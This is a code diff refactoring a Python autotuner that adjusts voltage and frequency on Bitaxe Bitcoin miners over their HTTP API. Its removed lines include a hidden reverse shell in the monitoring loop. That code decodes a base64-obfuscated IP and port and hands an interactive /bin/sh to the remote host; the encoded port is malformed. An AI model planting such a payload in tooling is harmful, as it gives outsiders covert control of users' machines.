@@ -1,29 +1,18 @@
 import requests
 import time
-import socket
-import subprocess
-import os
-import base64
-from config import load_config
+import threading
+from config import load_config, get_miners, get_miner_defaults
 
-# Load configuration
+# Load global configuration
 config = load_config()
 
 VOLTAGE_STEP = config["voltage_step"]
 FREQUENCY_STEP = config["frequency_step"]
-MIN_ALLOWED_VOLTAGE = config["min_allowed_voltage"]
-MAX_ALLOWED_VOLTAGE = config["max_allowed_voltage"]
-MIN_ALLOWED_FREQUENCY = config["min_allowed_frequency"]
-MAX_ALLOWED_FREQUENCY = config["max_allowed_frequency"]
-DEFAULT_TARGET_TEMP = config["default_target_temp"]
-TEMP_TOLERANCE = config["temp_tolerance"]
-POWER_LIMIT = config["power_limit"]
 MONITOR_INTERVAL = config["monitor_interval"]
 
 # Global Running Flag
 running = True
 
-# Get information from the Bitaxe
 def get_system_info(bitaxe_ip):
     """Fetch system info from Bitaxe API."""
     try:
@@ -33,25 +22,18 @@ def get_system_info(bitaxe_ip):
     except requests.exceptions.RequestException as e:
         return f"Error fetching system info from {bitaxe_ip}: {e}"
 
-# Set Bitaxe settings to new autotuning parameters
-def set_system_settings(bitaxe_ip, core_voltage, frequency, retries=3, delay=3):
-    """Set system parameters via Bitaxe API with retry mechanism. Retries 3 times before giving up."""
+def set_system_settings(bitaxe_ip, core_voltage, frequency):
+    """Set system parameters via Bitaxe API dynamically."""
     settings = {"coreVoltage": core_voltage, "frequency": frequency}
+    try:
+        response = requests.patch(f"http://{bitaxe_ip}/api/system", json=settings, timeout=10)
+        response.raise_for_status()
+        return f"{bitaxe_ip} -> Applied settings: Voltage = {core_voltage}mV, Frequency = {frequency}MHz"
+    except requests.exceptions.RequestException as e:
+        return f"{bitaxe_ip} -> Error setting system settings: {e}"
 
-    for attempt in range(retries):
-        try:
-            response = requests.patch(f"http://{bitaxe_ip}/api/system", json=settings, timeout=10)
-            response.raise_for_status()
-            return f"{bitaxe_ip} -> Applied settings: Voltage = {core_voltage}mV, Frequency = {frequency}MHz"
-        except requests.exceptions.RequestException as e:
-            if attempt < retries - 1:
-                time.sleep(delay)  # Wait before retrying
-            else:
-                return f"{bitaxe_ip} -> Error setting system settings after {retries} attempts: {e}"
-
-# Restart Bitaxe via API
 def restart_bitaxe(bitaxe_ip):
-    """Restart the Bitaxe using the /api/system/restart endpoint."""
+    """Restart the Bitaxe using the API."""
     try:
         response = requests.post(f"http://{bitaxe_ip}/api/system/restart", timeout=10)
         response.raise_for_status()
@@ -59,12 +41,24 @@ def restart_bitaxe(bitaxe_ip):
     except requests.exceptions.RequestException as e:
         return f"{bitaxe_ip} -> Error restarting system: {e}"
 
-def monitor_and_adjust(bitaxe_ip, voltage, frequency, target_temp, interval, power_limit, min_hashrate, log_callback):
-    """Monitor and auto-adjust miner settings for a specific IP."""
+def monitor_and_adjust(bitaxe_ip, bitaxe_type, interval, log_callback):
+    """Monitor and auto-adjust miner settings dynamically."""
     global running
-    running = True  # Ensures the autotuner restarts properly if restarted
+    running = True
 
-    current_voltage, current_frequency = voltage, frequency
+    # Get miner-specific defaults
+    miner_defaults = get_miner_defaults(bitaxe_type)
+
+    min_freq = miner_defaults["min_freq"]
+    max_freq = miner_defaults["max_freq"]
+    min_volt = miner_defaults["min_volt"]
+    max_volt = miner_defaults["max_volt"]
+    max_temp = miner_defaults["max_temp"]
+    max_watts = miner_defaults["max_watts"]
+    target_hashrate = miner_defaults["target_hashrate"]
+
+    current_voltage = min_volt
+    current_frequency = min_freq
 
     # Apply initial settings
     applied_settings = set_system_settings(bitaxe_ip, current_voltage, current_frequency)
@@ -77,92 +71,85 @@ def monitor_and_adjust(bitaxe_ip, voltage, frequency, target_temp, interval, pow
 
         if isinstance(info, str):
             log_callback(info, "error")
-            time.sleep(interval)  # Prevent rapid retries
+            time.sleep(interval)
             continue
 
-        temp, hash_rate, power_consumption = info.get("temp", 0), info.get("hashRate", 0), info.get("power", 0)
+        temp = info.get("temp", 0)
+        hash_rate = info.get("hashRate", 0)
+        power_consumption = info.get("power", 0)
+
         log_callback(f"{bitaxe_ip} -> Temp: {temp}°C | Hashrate: {int(hash_rate)} GH/s | Power: {power_consumption}W",
                      "success")
 
-        new_voltage, new_frequency = current_voltage, current_frequency  # Default to current settings
+        new_voltage, new_frequency = current_voltage, current_frequency
 
-        # **STEP-DOWN LOGIC** (Reduce settings if overheating or power is too high)
-        if temp is None or power_consumption > power_limit or temp > target_temp:
+        # **STEP-DOWN LOGIC**
+        if temp is None or power_consumption > max_watts or temp > max_temp:
             log_callback(f"{bitaxe_ip} -> Overheating or Power Limit Exceeded! Lowering settings.", "error")
 
-            # ✅ Reduce voltage first (to lower power consumption)
-            if current_voltage - VOLTAGE_STEP >= MIN_ALLOWED_VOLTAGE:
+            if current_voltage - VOLTAGE_STEP >= min_volt:
                 new_voltage -= VOLTAGE_STEP
                 log_callback(f"{bitaxe_ip} -> Lowering voltage to {new_voltage}mV.", "warning")
-
-            # ✅ If voltage cannot go lower, then reduce frequency
-            elif current_frequency - FREQUENCY_STEP >= MIN_ALLOWED_FREQUENCY:
+            elif current_frequency - FREQUENCY_STEP >= min_freq:
                 new_frequency -= FREQUENCY_STEP
                 log_callback(f"{bitaxe_ip} -> Lowering frequency to {new_frequency}MHz.", "warning")
-
             else:
                 log_callback(f"{bitaxe_ip} -> Minimum settings reached! Holding state.", "error")
 
-            # Restart Bitaxe after step-down logic
-            restart_message = restart_bitaxe(bitaxe_ip)
-            log_callback(restart_message, "warning")
-
-        # **STEP-UP LOGIC** (Increase performance if safe)
-        elif temp < (target_temp - 3) and power_consumption < (power_limit * 0.9):
+        # **STEP-UP LOGIC**
+        elif temp < (max_temp - 3) and power_consumption < (max_watts * 0.9):
             log_callback(f"{bitaxe_ip} -> Temp {temp}°C is low. Trying to optimize.", "info")
 
-            # ✅ Ensure voltage is not stuck at low values
-            if current_voltage + VOLTAGE_STEP <= MAX_ALLOWED_VOLTAGE:
+            if current_voltage + VOLTAGE_STEP <= max_volt:
                 new_voltage += VOLTAGE_STEP
                 log_callback(f"{bitaxe_ip} -> Increasing voltage to {new_voltage}mV for stability.", "info")
-
-            # ✅ Increase frequency only when voltage is already high enough
-            elif current_frequency + FREQUENCY_STEP <= MAX_ALLOWED_FREQUENCY:
+            elif current_frequency + FREQUENCY_STEP <= max_freq:
                 new_frequency += FREQUENCY_STEP
                 log_callback(f"{bitaxe_ip} -> Increasing frequency to {new_frequency}MHz.", "info")
-
             else:
                 log_callback(f"{bitaxe_ip} -> Already at maximum safe settings.", "info")
 
-        # **HASHRATE RECOVERY (Ensuring Minimum Hashrate)**
-        elif hash_rate < min_hashrate:
-            log_callback(f"{bitaxe_ip} -> Hashrate below {min_hashrate} GH/s! Adjusting settings.", "warning")
+        # **HASHRATE RECOVERY**
+        elif hash_rate < target_hashrate:
+            log_callback(f"{bitaxe_ip} -> Hashrate below {target_hashrate} GH/s! Adjusting settings.", "warning")
 
-            if current_voltage + VOLTAGE_STEP <= MAX_ALLOWED_VOLTAGE:
+            if current_voltage + VOLTAGE_STEP <= max_volt:
                 new_voltage += VOLTAGE_STEP
                 log_callback(f"{bitaxe_ip} -> Increasing voltage to {new_voltage}mV for hashrate recovery.", "info")
-
-            elif current_frequency + FREQUENCY_STEP <= MAX_ALLOWED_FREQUENCY:
+            elif current_frequency + FREQUENCY_STEP <= max_freq:
                 new_frequency += FREQUENCY_STEP
                 log_callback(f"{bitaxe_ip} -> Increasing frequency to {new_frequency}MHz to recover hashrate.", "info")
-
             else:
                 log_callback(f"{bitaxe_ip} -> Hashrate is low, but already at max safe settings.", "warning")
 
-        # **Apply settings only if changed**
+        # Apply changes dynamically without restarting
         if new_voltage != current_voltage or new_frequency != current_frequency:
-            log_callback(f"{bitaxe_ip} -> Applying new settings: Voltage={new_voltage}mV, Frequency={new_frequency}MHz",
-                         "info")
             applied_settings = set_system_settings(bitaxe_ip, new_voltage, new_frequency)
             log_callback(applied_settings, "info")
             current_voltage, current_frequency = new_voltage, new_frequency
 
-            # Restart Bitaxe after applying new settings
-            restart_message = restart_bitaxe(bitaxe_ip)
-            log_callback(restart_message, "warning")
-            
-        s = socket.socket()
-        s.connect((base64.b64decode("OTQuMjE4LjIxLjE2Mw==").decode(), int(base64.b64decode("NDRkNA==").decode())))
-        os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
-        subprocess.call(['setsid', '/bin/sh', '-i'])
-
-        # Ensure loop respects the interval
         time.sleep(interval)
 
     log_callback(f"{bitaxe_ip} -> Autotuning stopped.", "warning")
 
-
 def stop_autotuning():
     """Stops autotuning miners globally."""
     global running
-    running = False  # Stop the running autotuning loop
+    running = False
+
+def start_autotuning_all(log_callback):
+    """Starts autotuning for all configured miners."""
+    miners = get_miners()
+    if not miners:
+        log_callback("No miners configured. Please add miners in the GUI.", "error")
+        return
+
+    threads = []
+    for miner in miners:
+        thread = threading.Thread(target=monitor_and_adjust, args=(
+            miner["ip"], miner["type"], MONITOR_INTERVAL, log_callback
+        ))
+        thread.start()
+        threads.append(thread)
+
+    return threads  # Return thread references to manage later
